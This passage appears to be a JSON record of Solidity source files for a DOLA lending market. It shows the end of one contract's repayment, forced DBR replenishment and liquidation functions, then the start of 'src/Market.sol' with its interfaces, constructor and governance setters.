amount;\n        totalDebt -= amount;\n        dbr.onRepay(user, amount);\n        dola.transferFrom(msg.sender, address(this), amount);\n        emit Repay(user, msg.sender, amount);\n    }\n\n    /**\n    @notice Bundles repayment and withdrawal into a single function call.\n    @param repayAmount Amount of DOLA to be repaid\n    @param withdrawAmount Amount of underlying to be withdrawn from the escrow\n    */\n    function repayAndWithdraw(uint repayAmount, uint withdrawAmount) public {\n        repay(msg.sender, repayAmount);\n        withdraw(withdrawAmount);\n    }\n\n    /**\n    @notice Function for forcing a user to replenish their DBR deficit at a pre-determined price.\n     The replenishment will accrue additional DOLA debt.\n     On a successful call, the caller will be paid a replenishment incentive.\n    @dev The function will only top the user back up to 0, meaning that the user will have a DBR deficit again in the next block.\n    @param user The address of the user being forced to replenish DBR\n    @param amount The amount of DBR the user will be replenished.\n    */\n    function forceReplenish(address user, uint amount) public {\n        uint deficit = dbr.deficitOf(user);\n        require(deficit > 0, \"No DBR deficit\");\n        require(deficit >= amount, \"Amount > deficit\");\n        uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;\n        uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;\n        debts[user] += replenishmentCost;\n        uint collateralValue = getCollateralValueInternal(user);\n        require(collateralValue >= debts[user], \"Exceeded collateral value\");\n        totalDebt += replenishmentCost;\n        dbr.onForceReplenish(user, amount);\n        dola.transfer(msg.sender, replenisherReward);\n        emit ForceReplenish(user, msg.sender, amount, replenishmentCost, replenisherReward);\n    }\n\n    /**\n    @notice View function for getting the amount of liquidateable debt a user holds.\n    @param user The address of the user.\n    */\n    function getLiquidatableDebt(address user) public view returns (uint) {\n        uint debt = debts[user];\n        if (debt == 0) return 0;\n        uint credit = getCreditLimit(user);\n        if(credit >= debt) return 0;\n        return debt * liquidationFactorBps / 10000;\n    }\n\n    /**\n    @notice Function for liquidating a user's under water debt. Debt is under water when the value of a user's debt is above their collateral factor.\n    @param user The user to be liquidated\n    @param repaidDebt Th amount of user user debt to liquidate.\n    */\n    function liquidate(address user, uint repaidDebt) public {\n        require(repaidDebt > 0, \"Must repay positive debt\");\n        uint debt = debts[user];\n        require(getCreditLimitInternal(user) < debt, \"User debt is healthy\");\n        require(repaidDebt <= debt * liquidationFactorBps / 10000, \"Exceeded liquidation factor\");\n        uint price = oracle.getPrice(address(collateral), collateralFactorBps);\n        uint liquidatorReward = repaidDebt * 1 ether / price;\n        liquidatorReward += liquidatorReward * liquidationIncentiveBps / 10000;\n        debts[user] -= repaidDebt;\n        totalDebt -= repaidDebt;\n        dbr.onRepay(user, repaidDebt);\n        dola.transferFrom(msg.sender, address(this), repaidDebt);\n        IEscrow escrow = predictEscrow(user);\n        escrow.pay(msg.sender, liquidatorReward);\n        if(liquidationFeeBps > 0) {\n            uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;\n            if(escrow.balance() >= liquidationFee) {\n                escrow.pay(gov, liquidationFee);\n            }\n        }\n        emit Liquidate(user, msg.sender, repaidDebt, liquidatorReward);\n    }\n    \n    event Deposit(address indexed account, uint amount);\n    event Borrow(address indexed account, uint amount);\n    event Withdraw(address indexed account, address indexed to, uint amount);\n    event Repay(address indexed account, address indexed repayer, uint amount);\n    event ForceReplenish(address indexed account, address indexed replenisher, uint deficit, uint replenishmentCost, uint replenisherReward);\n    event Liquidate(address indexed account, address indexed liquidator, uint repaidDebt, uint liquidatorReward);\n    event CreateEscrow(address indexed user, address escrow);\n}"
    },
    {
      "filename": "src/Market.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\n// Caution. We assume all failed transfers cause reverts and ignore the returned bool.\ninterface IERC20 {\n    function transfer(address,uint) external returns (bool);\n    function transferFrom(address,address,uint) external returns (bool);\n    function balanceOf(address) external view returns (uint);\n}\n\ninterface IOracle {\n    function getPrice(address,uint) external returns (uint);\n    function viewPrice(address,uint) external view returns (uint);\n}\n\ninterface IEscrow {\n    function initialize(IERC20 _token, address beneficiary) external;\n    function onDeposit() external;\n    function pay(address recipient, uint amount) external;\n    function balance() external view returns (uint);\n}\n\ninterface IDolaBorrowingRights {\n    function onBorrow(address user, uint additionalDebt) external;\n    function onRepay(address user, uint repaidDebt) external;\n    function onForceReplenish(address user, uint amount) external;\n    function balanceOf(address user) external view returns (uint);\n    function deficitOf(address user) external view returns (uint);\n    function replenishmentPriceBps() external view returns (uint);\n}\n\ninterface IBorrowController {\n    function borrowAllowed(address msgSender, address borrower, uint amount) external returns (bool);\n}\n\ncontract Market {\n\n    address public gov;\n    address public lender;\n    address public pauseGuardian;\n    address public immutable escrowImplementation;\n    IDolaBorrowingRights public immutable dbr;\n    IBorrowController public borrowController;\n    IERC20 public immutable dola = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);\n    IERC20 public immutable collateral;\n    IOracle public oracle;\n    uint public collateralFactorBps;\n    uint public replenishmentIncentiveBps;\n    uint public liquidationIncentiveBps;\n    uint public liquidationFeeBps;\n    uint public liquidationFactorBps = 5000; // 50% by default\n    bool immutable callOnDepositCallback;\n    bool public borrowPaused;\n    uint public totalDebt;\n    uint256 internal immutable INITIAL_CHAIN_ID;\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n    mapping (address => IEscrow) public escrows; // user => escrow\n    mapping (address => uint) public debts; // user => debt\n    mapping(address => uint256) public nonces; // user => nonce\n\n    constructor (\n        address _gov,\n        address _lender,\n        address _pauseGuardian,\n        address _escrowImplementation,\n        IDolaBorrowingRights _dbr,\n        IERC20 _collateral,\n        IOracle _oracle,\n        uint _collateralFactorBps,\n        uint _replenishmentIncentiveBps,\n        uint _liquidationIncentiveBps,\n        bool _callOnDepositCallback\n    ) {\n        require(_collateralFactorBps < 10000, \"Invalid collateral factor\");\n        require(_liquidationIncentiveBps > 0 && _liquidationIncentiveBps < 10000, \"Invalid liquidation incentive\");\n        require(_replenishmentIncentiveBps < 10000, \"Replenishment incentive must be less than 100%\");\n        gov = _gov;\n        lender = _lender;\n        pauseGuardian = _pauseGuardian;\n        escrowImplementation = _escrowImplementation;\n        dbr = _dbr;\n        collateral = _collateral;\n        oracle = _oracle;\n        collateralFactorBps = _collateralFactorBps;\n        replenishmentIncentiveBps = _replenishmentIncentiveBps;\n        liquidationIncentiveBps = _liquidationIncentiveBps;\n        callOnDepositCallback = _callOnDepositCallback;\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n    }\n    \n    modifier onlyGov {\n        require(msg.sender == gov, \"Only gov can call this function\");\n        _;\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                    keccak256(bytes(\"DBR MARKET\")),\n                    keccak256(\"1\"),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    /**\n    @notice sets the oracle to a new oracle. Only callable by governance.\n    @param _oracle The new oracle conforming to the IOracle interface.\n    */\n    function setOracle(IOracle _oracle) public onlyGov { oracle = _oracle; }\n\n    /**\n    @notice sets the borrow controller to a new borrow controller. Only callable by governance.\n    @param _borrowController The new borrow controller conforming to the IBorrowController interface.\n    */\n    function setBorrowController(IBorrowController _borrowController) public onlyGov { borrowController = _borrowController; }\n\n    /**\n    @notice sets the address of governance. Only callable by governance."
    }
  ]
}